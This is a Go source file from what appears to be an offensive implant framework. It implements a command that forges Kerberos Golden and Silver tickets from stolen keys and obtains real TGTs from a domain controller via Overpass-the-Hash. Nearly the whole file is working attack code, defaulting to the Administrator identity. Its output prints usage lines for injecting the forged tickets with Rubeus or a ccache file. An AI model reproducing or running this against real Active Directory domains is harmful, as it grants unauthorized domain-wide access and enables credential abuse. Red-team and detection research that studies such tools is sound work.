package commands

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/asn1tools"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana"
	"github.com/jcmturner/gokrb5/v8/iana/asnAppTag"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

type TicketCommand struct{}

func (c *TicketCommand) Name() string { return "ticket" }
func (c *TicketCommand) Description() string {
	return "Forge Kerberos tickets (Golden/Silver) from extracted keys (T1558.001)"
}

type ticketArgs struct {
	Action    string `json:"action"`     // forge, request
	Realm     string `json:"realm"`      // domain (e.g., CORP.LOCAL)
	Username  string `json:"username"`   // target identity (e.g., Administrator)
	UserRID   int    `json:"user_rid"`   // RID (default: 500 for Administrator)
	DomainSID string `json:"domain_sid"` // domain SID (e.g., S-1-5-21-...)
	Key       string `json:"key"`        // hex AES256 or NT hash key
	KeyType   string `json:"key_type"`   // aes256, aes128, rc4 (default: aes256)
	KVNO      int    `json:"kvno"`       // key version number (default: 2)
	Lifetime  int    `json:"lifetime"`   // ticket lifetime in hours (default: 24)
	Format    string `json:"format"`     // kirbi, ccache (default: kirbi)
	SPN       string `json:"spn"`        // for Silver Ticket: service/host
	Server    string `json:"server"`     // KDC address for request action (e.g., dc01.corp.local)
}

func (c *TicketCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return structs.CommandResult{
			Output:    "Error: parameters required. Use -action forge -realm DOMAIN -username user -key <hex_key> -domain_sid <SID>",
			Status:    "error",
			Completed: true,
		}
	}

	var args ticketArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	switch strings.ToLower(args.Action) {
	case "forge":
		return ticketForge(args)
	case "request":
		return ticketRequest(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: forge, request", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func ticketForge(args ticketArgs) structs.CommandResult {
	// Validate required args
	if args.Realm == "" || args.Username == "" || args.Key == "" || args.DomainSID == "" {
		return structs.CommandResult{
			Output:    "Error: realm, username, key, and domain_sid are required for forging",
			Status:    "error",
			Completed: true,
		}
	}

	// Defaults
	if args.UserRID <= 0 {
		args.UserRID = 500 // Administrator
	}
	if args.Lifetime <= 0 {
		args.Lifetime = 24
	}
	if args.KVNO <= 0 {
		args.KVNO = 2
	}
	if args.Format == "" {
		args.Format = "kirbi"
	}
	if args.KeyType == "" {
		args.KeyType = "aes256"
	}

	realm := strings.ToUpper(args.Realm)

	// Decode the key
	keyBytes, err := hex.DecodeString(args.Key)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding key hex: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Determine encryption type
	var etypeID int32
	switch strings.ToLower(args.KeyType) {
	case "aes256":
		etypeID = 18
		if len(keyBytes) != 32 {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: AES256 key must be 32 bytes (64 hex chars), got %d bytes", len(keyBytes)),
				Status:    "error",
				Completed: true,
			}
		}
	case "aes128":
		etypeID = 17
		if len(keyBytes) != 16 {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: AES128 key must be 16 bytes (32 hex chars), got %d bytes", len(keyBytes)),
				Status:    "error",
				Completed: true,
			}
		}
	case "rc4", "ntlm":
		etypeID = 23
		if len(keyBytes) != 16 {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: RC4/NTLM key must be 16 bytes (32 hex chars), got %d bytes", len(keyBytes)),
				Status:    "error",
				Completed: true,
			}
		}
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: unknown key_type %q. Use: aes256, aes128, rc4", args.KeyType),
			Status:    "error",
			Completed: true,
		}
	}

	serviceKey := types.EncryptionKey{
		KeyType:  etypeID,
		KeyValue: keyBytes,
	}

	// Generate random session key (same etype as service key)
	sessionKey, err := ticketGenerateSessionKey(etypeID)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error generating session key: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Determine service principal
	var sname types.PrincipalName
	isGolden := args.SPN == ""
	if isGolden {
		// Golden Ticket: TGT for krbtgt/REALM
		sname = types.PrincipalName{
			NameType:   nametype.KRB_NT_SRV_INST,
			NameString: []string{"krbtgt", realm},
		}
	} else {
		// Silver Ticket: TGS for specific SPN (e.g., cifs/dc01.corp.local)
		parts := strings.SplitN(args.SPN, "/", 2)
		sname = types.PrincipalName{
			NameType:   nametype.KRB_NT_SRV_INST,
			NameString: parts,
		}
	}

	now := time.Now().UTC()
	endTime := now.Add(time.Duration(args.Lifetime) * time.Hour)
	renewTill := now.Add(7 * 24 * time.Hour)

	// Ticket flags: Forwardable | Proxiable | Renewable | Initial | Pre-authent
	flagBytes := make([]byte, 4)
	flagBytes[0] = 0x50 // Forwardable (bit 1) | Proxiable (bit 3)
	flagBytes[1] = 0xa0 // Renewable (bit 8) | Initial (bit 9)
	// bit 10 = Pre-authent
	flagBytes[1] |= 0x10
	ticketFlags := asn1.BitString{Bytes: flagBytes, BitLength: 32}

	// Create EncTicketPart
	etp := messages.EncTicketPart{
		Flags:  ticketFlags,
		Key:    sessionKey,
		CRealm: realm,
		CName: types.PrincipalName{
			NameType:   nametype.KRB_NT_PRINCIPAL,
			NameString: []string{args.Username},
		},
		Transited: messages.TransitedEncoding{
			TRType:   0,
			Contents: []byte{},
		},
		AuthTime:  now,
		StartTime: now,
		EndTime:   endTime,
		RenewTill: renewTill,
	}

	// Marshal and encrypt
	etpBytes, err := asn1.Marshal(etp)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error marshaling EncTicketPart: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	etpBytes = asn1tools.AddASNAppTag(etpBytes, asnAppTag.EncTicketPart)

	encData, err := crypto.GetEncryptedData(etpBytes, serviceKey, keyusage.KDC_REP_TICKET, args.KVNO)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error encrypting ticket: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	ticket := messages.Ticket{
		TktVNO:  iana.PVNO,
		Realm:   realm,
		SName:   sname,
		EncPart: encData,
	}

	// Generate output
	var output string
	switch strings.ToLower(args.Format) {
	case "kirbi":
		kirbiBytes, err := ticketToKirbi(ticket, sessionKey, args.Username, realm, sname, ticketFlags, now, endTime, renewTill)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error creating kirbi: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		output = ticketFormatOutput(args, realm, isGolden, sessionKey, now, endTime, base64.StdEncoding.EncodeToString(kirbiBytes))
	case "ccache":
		ticketBytes, err := ticket.Marshal()
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error marshaling ticket: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		ccacheBytes := ticketToCCache(ticketBytes, sessionKey, args.Username, realm, sname, ticketFlags, now, endTime, renewTill)
		output = ticketFormatOutput(args, realm, isGolden, sessionKey, now, endTime, base64.StdEncoding.EncodeToString(ccacheBytes))
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: unknown format %q. Use: kirbi, ccache", args.Format),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

func ticketFormatOutput(args ticketArgs, realm string, isGolden bool, sessionKey types.EncryptionKey, start, end time.Time, b64 string) string {
	var sb strings.Builder
	ticketType := "Golden Ticket (TGT)"
	if !isGolden {
		ticketType = fmt.Sprintf("Silver Ticket (TGS: %s)", args.SPN)
	}
	sb.WriteString(fmt.Sprintf("[*] %s forged successfully\n", ticketType))
	sb.WriteString(fmt.Sprintf("    User:      %s@%s (RID: %d)\n", args.Username, realm, args.UserRID))
	sb.WriteString(fmt.Sprintf("    Domain:    %s\n", realm))
	sb.WriteString(fmt.Sprintf("    SID:       %s\n", args.DomainSID))
	sb.WriteString(fmt.Sprintf("    Key Type:  %s (etype %d)\n", args.KeyType, sessionKey.KeyType))
	sb.WriteString(fmt.Sprintf("    Valid:     %s — %s\n", start.Format("2006-01-02 15:04:05 UTC"), end.Format("2006-01-02 15:04:05 UTC")))
	sb.WriteString(fmt.Sprintf("    Format:    %s\n", args.Format))
	sb.WriteString(fmt.Sprintf("    KVNO:      %d\n", args.KVNO))
	sb.WriteString(fmt.Sprintf("\n[+] Base64 %s ticket:\n%s\n", args.Format, b64))

	if args.Format == "kirbi" {
		sb.WriteString("\n[*] Usage: Rubeus.exe ptt /ticket:<base64>\n")
		sb.WriteString("[*] Usage: [IO.File]::WriteAllBytes('ticket.kirbi', [Convert]::FromBase64String('<base64>'))\n")
	} else {
		sb.WriteString("\n[*] Usage: echo '<base64>' | base64 -d > /tmp/krb5cc_forged\n")
		sb.WriteString("[*] Usage: export KRB5CCNAME=/tmp/krb5cc_forged\n")
	}

	return sb.String()
}

func ticketGenerateSessionKey(etypeID int32) (types.EncryptionKey, error) {
	et, err := crypto.GetEtype(etypeID)
	if err != nil {
		return types.EncryptionKey{}, err
	}
	keySize := et.GetKeyByteSize()
	keyValue := make([]byte, keySize)
	if _, err := rand.Read(keyValue); err != nil {
		return types.EncryptionKey{}, err
	}
	return types.EncryptionKey{
		KeyType:  etypeID,
		KeyValue: keyValue,
	}, nil
}

// ticketToKirbi creates a KRB-CRED (kirbi) format from a forged ticket.
// KRBCred has no Marshal() method in gokrb5, so we construct ASN.1 manually.
func ticketToKirbi(ticket messages.Ticket, sessionKey types.EncryptionKey, username, realm string, sname types.PrincipalName, flags asn1.BitString, authTime, endTime, renewTill time.Time) ([]byte, error) {
	ticketBytes, err := ticket.Marshal()
	if err != nil {
		return nil, fmt.Errorf("marshal ticket: %w", err)
	}

	// Build EncKrbCredPart containing ticket info
	credInfo := messages.KrbCredInfo{
		Key:       sessionKey,
		PRealm:    realm,
		PName:     types.PrincipalName{NameType: nametype.KRB_NT_PRINCIPAL, NameString: []string{username}},
		Flags:     flags,
		AuthTime:  authTime,
		StartTime: authTime,
		EndTime:   endTime,
		RenewTill: renewTill,
		SRealm:    realm,
		SName:     sname,
	}

	encCredPart := messages.EncKrbCredPart{
		TicketInfo: []messages.KrbCredInfo{credInfo},
	}

	encCredPartBytes, err := asn1.Marshal(encCredPart)
	if err != nil {
		return nil, fmt.Errorf("marshal EncKrbCredPart: %w", err)
	}
	encCredPartBytes = asn1tools.AddASNAppTag(encCredPartBytes, asnAppTag.EncKrbCredPart)

	// KRB-CRED EncPart is "encrypted" with no encryption (etype 0, cipher = plaintext)
	// This is how Mimikatz and Rubeus generate kirbi files
	encPart := types.EncryptedData{
		EType:  0,
		Cipher: encCredPartBytes,
	}

	// Build KRBCred ASN.1 manually
	// KRB-CRED ::= [APPLICATION 22] SEQUENCE {
	//   pvno    [0] INTEGER,
	//   msg-type [1] INTEGER,
	//   tickets  [2] SEQUENCE OF Ticket,
	//   enc-part [3] EncryptedData
	// }
	type krbCredASN1 struct {
		PVNO    int                 `asn1:"explicit,tag:0"`
		MsgType int                 `asn1:"explicit,tag:1"`
		Tickets asn1.RawValue       `asn1:"explicit,tag:2"`
		EncPart types.EncryptedData `asn1:"explicit,tag:3"`
	}

	// Wrap ticket bytes in SEQUENCE
	ticketsSeq, err := asn1.Marshal(asn1.RawValue{
		Class:      asn1.ClassUniversal,
		Tag:        asn1.TagSequence,
		IsCompound: true,
		Bytes:      ticketBytes,
	})
	if err != nil {
		return nil, fmt.Errorf("marshal tickets sequence: %w", err)
	}

	krbCred := krbCredASN1{
		PVNO:    iana.PVNO,
		MsgType: 22, // KRB_CRED
		Tickets: asn1.RawValue{FullBytes: ticketsSeq},
		EncPart: encPart,
	}

	krbCredBytes, err := asn1.Marshal(krbCred)
	if err != nil {
		return nil, fmt.Errorf("marshal KRBCred: %w", err)
	}
	krbCredBytes = asn1tools.AddASNAppTag(krbCredBytes, asnAppTag.KRBCred)

	return krbCredBytes, nil
}

// ticketToCCache creates a ccache file (version 4) from a forged ticket.
func ticketToCCache(ticketBytes []byte, sessionKey types.EncryptionKey, username, realm string, sname types.PrincipalName, flags asn1.BitString, authTime, endTime, renewTill time.Time) []byte {
	var buf []byte

	// File format version: 0x0504 (version 4)
	buf = append(buf, 0x05, 0x04)

	// Header length (v4): 12 bytes (one tag)
	headerLen := uint16(12)
	buf = binary.BigEndian.AppendUint16(buf, headerLen)
	// Header tag: deltatime (tag=1, length=8, value=0)
	buf = binary.BigEndian.AppendUint16(buf, 1) // tag
	buf = binary.BigEndian.AppendUint16(buf, 8) // length
	buf = append(buf, 0, 0, 0, 0, 0, 0, 0, 0)  // 8 bytes of zero

	// Default principal
	buf = ccacheWritePrincipal(buf, realm, []string{username})

	// Credential entry
	// Client principal
	buf = ccacheWritePrincipal(buf, realm, []string{username})
	// Server principal
	buf = ccacheWritePrincipal(buf, realm, sname.NameString)

	// Keyblock
	buf = binary.BigEndian.AppendUint16(buf, uint16(sessionKey.KeyType))
	buf = binary.BigEndian.AppendUint16(buf, 0) // etype (v4 only)
	buf = binary.BigEndian.AppendUint16(buf, uint16(len(sessionKey.KeyValue)))
	buf = append(buf, sessionKey.KeyValue...)

	// Times
	buf = binary.BigEndian.AppendUint32(buf, uint32(authTime.Unix()))
	buf = binary.BigEndian.AppendUint32(buf, uint32(authTime.Unix()))
	buf = binary.BigEndian.AppendUint32(buf, uint32(endTime.Unix()))
	buf = binary.BigEndian.AppendUint32(buf, uint32(renewTill.Unix()))

	// is_skey (uint8)
	buf = append(buf, 0)

	// Ticket flags (uint32, big-endian)
	flagVal := uint32(0)
	if len(flags.Bytes) >= 4 {
		flagVal = binary.BigEndian.Uint32(flags.Bytes)
	}
	buf = binary.BigEndian.AppendUint32(buf, flagVal)

	// Addresses (count=0)
	buf = binary.BigEndian.AppendUint32(buf, 0)

	// AuthData (count=0)
	buf = binary.BigEndian.AppendUint32(buf, 0)

	// Ticket data
	buf = binary.BigEndian.AppendUint32(buf, uint32(len(ticketBytes)))
	buf = append(buf, ticketBytes...)

	// Second ticket (empty)
	buf = binary.BigEndian.AppendUint32(buf, 0)

	return buf
}

// ticketRequest performs an AS exchange (Overpass-the-Hash / Pass-the-Key) to obtain
// a real TGT from the KDC using an extracted Kerberos key. The resulting TGT can be
// exported as kirbi or ccache and injected via klist import. (T1550.002)
func ticketRequest(args ticketArgs) structs.CommandResult {
	if args.Realm == "" || args.Username == "" || args.Key == "" || args.Server == "" {
		return structs.CommandResult{
			Output:    "Error: realm, username, key, and server (KDC) are required for request",
			Status:    "error",
			Completed: true,
		}
	}

	realm := strings.ToUpper(args.Realm)
	if args.Format == "" {
		args.Format = "kirbi"
	}
	if args.KeyType == "" {
		args.KeyType = "aes256"
	}

	// Parse key
	keyBytes, err := hex.DecodeString(args.Key)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding key hex: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	var etypeID int32
	var etypeCfgName string
	switch strings.ToLower(args.KeyType) {
	case "aes256":
		etypeID = 18
		etypeCfgName = "aes256-cts-hmac-sha1-96"
		if len(keyBytes) != 32 {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: AES256 key must be 32 bytes, got %d", len(keyBytes)),
				Status:    "error",
				Completed: true,
			}
		}
	case "aes128":
		etypeID = 17
		etypeCfgName = "aes128-cts-hmac-sha1-96"
		if len(keyBytes) != 16 {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: AES128 key must be 16 bytes, got %d", len(keyBytes)),
				Status:    "error",
				Completed: true,
			}
		}
	case "rc4", "ntlm":
		etypeID = 23
		etypeCfgName = "rc4-hmac"
		if len(keyBytes) != 16 {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: RC4/NTLM key must be 16 bytes, got %d", len(keyBytes)),
				Status:    "error",
				Completed: true,
			}
		}
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: unknown key_type %q. Use: aes256, aes128, rc4", args.KeyType),
			Status:    "error",
			Completed: true,
		}
	}

	userKey := types.EncryptionKey{
		KeyType:  etypeID,
		KeyValue: keyBytes,
	}

	// Resolve KDC address
	kdcAddr := args.Server
	if !strings.Contains(kdcAddr, ":") {
		kdcAddr += ":88"
	}

	// Create gokrb5 config
	cfgStr := fmt.Sprintf("[libdefaults]\n  default_realm = %s\n  dns_lookup_kdc = false\n  dns_lookup_realm = false\n  default_tkt_enctypes = %s\n  default_tgs_enctypes = %s\n[realms]\n  %s = {\n    kdc = %s\n  }\n",
		realm, etypeCfgName, etypeCfgName, realm, kdcAddr)
	cfg, err := config.NewFromString(cfgStr)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating Kerberos config: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Build AS-REQ
	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{args.Username},
	}
	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error building AS-REQ: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Force our etype
	asReq.ReqBody.EType = []int32{etypeID}

	// Add PA-ENC-TIMESTAMP pre-authentication
	paTS := types.PAEncTSEnc{
		PATimestamp: time.Now().UTC(),
	}
	paTSBytes, err := asn1.Marshal(paTS)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error marshaling PA-ENC-TIMESTAMP: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	encTS, err := crypto.GetEncryptedData(paTSBytes, userKey, keyusage.AS_REQ_PA_ENC_TIMESTAMP, 0)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error encrypting PA-ENC-TIMESTAMP: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	encTSBytes, err := asn1.Marshal(encTS)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error marshaling encrypted timestamp: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	asReq.PAData = types.PADataSequence{
		{PADataType: 2, PADataValue: encTSBytes}, // PA-ENC-TIMESTAMP
	}

	// Marshal AS-REQ
	reqBytes, err := asReq.Marshal()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error marshaling AS-REQ: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Send over TCP to KDC
	conn, err := net.DialTimeout("tcp", kdcAddr, 10*time.Second)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error connecting to KDC %s: %v", kdcAddr, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(15 * time.Second))

	// TCP Kerberos framing: 4-byte big-endian length prefix
	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(reqBytes)))
	if _, err := conn.Write(lenBuf); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error sending to KDC: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	if _, err := conn.Write(reqBytes); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error sending AS-REQ: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Read response
	if _, err := io.ReadFull(conn, lenBuf); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading KDC response length: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	respLen := binary.BigEndian.Uint32(lenBuf)
	if respLen > 1048576 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: KDC response too large (%d bytes)", respLen),
			Status:    "error",
			Completed: true,
		}
	}
	respBuf := make([]byte, respLen)
	if _, err := io.ReadFull(conn, respBuf); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading KDC response: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Check if response is KRB-ERROR ([APPLICATION 30] = 0x7e)
	if len(respBuf) > 0 && respBuf[0] == 0x7e {
		var krbErr messages.KRBError
		if err := krbErr.Unmarshal(respBuf); err == nil {
			errMsg := ticketKrbErrorMsg(krbErr.ErrorCode)
			if krbErr.EText != "" {
				errMsg += ": " + krbErr.EText
			}
			return structs.CommandResult{
				Output:    fmt.Sprintf("KDC error: %s (code %d)", errMsg, krbErr.ErrorCode),
				Status:    "error",
				Completed: true,
			}
		}
	}

	// Parse AS-REP
	var asRep messages.ASRep
	if err := asRep.Unmarshal(respBuf); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing AS-REP: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Decrypt EncPart manually using crypto.DecryptEncPart
	// (ASRep.DecryptEncPart requires credentials.Credentials, so we use the lower-level API)
	plainBytes, err := crypto.DecryptEncPart(asRep.EncPart, userKey, 3) // key usage 3 = AS-REP EncPart
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decrypting AS-REP (wrong key?): %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	var decPart messages.EncKDCRepPart
	if err := decPart.Unmarshal(plainBytes); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing decrypted AS-REP: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Extract ticket info from decrypted AS-REP
	sessionKey := decPart.Key
	sname := decPart.SName
	flags := decPart.Flags
	authTime := decPart.AuthTime
	endTime := decPart.EndTime
	renewTill := decPart.RenewTill

	// Export as kirbi or ccache
	var output string
	switch strings.ToLower(args.Format) {
	case "kirbi":
		kirbiBytes, err := ticketToKirbi(asRep.Ticket, sessionKey, args.Username, realm, sname, flags, authTime, endTime, renewTill)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error creating kirbi: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		output = ticketRequestFormatOutput(args, realm, sessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(kirbiBytes))
	case "ccache":
		ticketBytes, err := asRep.Ticket.Marshal()
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error marshaling ticket: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		ccacheBytes := ticketToCCache(ticketBytes, sessionKey, args.Username, realm, sname, flags, authTime, endTime, renewTill)
		output = ticketRequestFormatOutput(args, realm, sessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(ccacheBytes))
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: unknown format %q. Use: kirbi, ccache", args.Format),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

func ticketRequestFormatOutput(args ticketArgs, realm string, sessionKey types.EncryptionKey, start, end time.Time, b64 string) string {
	var sb strings.Builder
	sb.WriteString("[*] TGT obtained via Overpass-the-Hash (AS-REQ)\n")
	sb.WriteString(fmt.Sprintf("    User:      %s@%s\n", args.Username, realm))
	sb.WriteString(fmt.Sprintf("    KDC:       %s\n", args.Server))
	sb.WriteString(fmt.Sprintf("    Key Type:  %s (etype %d)\n", args.KeyType, sessionKey.KeyType))
	sb.WriteString(fmt.Sprintf("    Valid:     %s — %s\n", start.Format("2006-01-02 15:04:05 UTC"), end.Format("2006-01-02 15:04:05 UTC")))
	sb.WriteString(fmt.Sprintf("    Format:    %s\n", args.Format))
	sb.WriteString(fmt.Sprintf("\n[+] Base64 %s ticket:\n%s\n", args.Format, b64))

	if args.Format == "kirbi" {
		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
		sb.WriteString("[*] Or:     Rubeus.exe ptt /ticket:<base64>\n")
	} else {
		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
		sb.WriteString("[*] Or:     echo '<base64>' | base64 -d > /tmp/krb5cc && export KRB5CCNAME=/tmp/krb5cc\n")
	}

	return sb.String()
}

func ticketKrbErrorMsg(code int32) string {
	switch code {
	case 6:
		return "KDC_ERR_C_PRINCIPAL_UNKNOWN — client not found in Kerberos database"
	case 12:
		return "KDC_ERR_POLICY — KDC policy rejects request"
	case 18:
		return "KDC_ERR_CLIENT_REVOKED — account disabled or locked"
	case 23:
		return "KDC_ERR_KEY_EXPIRED — password/key has expired"
	case 24:
		return "KDC_ERR_PREAUTH_FAILED — wrong key or pre-authentication failed"
	case 25:
		return "KDC_ERR_PREAUTH_REQUIRED — pre-authentication required"
	case 31:
		return "KRB_AP_ERR_SKEW — clock skew too great between client and KDC"
	case 68:
		return "KDC_ERR_WRONG_REALM — wrong realm"
	default:
		return fmt.Sprintf("Kerberos error code %d", code)
	}
}

func ccacheWritePrincipal(buf []byte, realm string, components []string) []byte {
	// name_type (uint32)
	buf = binary.BigEndian.AppendUint32(buf, 1) // KRB_NT_PRINCIPAL
	// num_components (uint32)
	buf = binary.BigEndian.AppendUint32(buf, uint32(len(components)))
	// realm
	buf = binary.BigEndian.AppendUint32(buf, uint32(len(realm)))
	buf = append(buf, []byte(realm)...)
	// components
	for _, c := range components {
		buf = binary.BigEndian.AppendUint32(buf, uint32(len(c)))
		buf = append(buf, []byte(c)...)
	}
	return buf
}
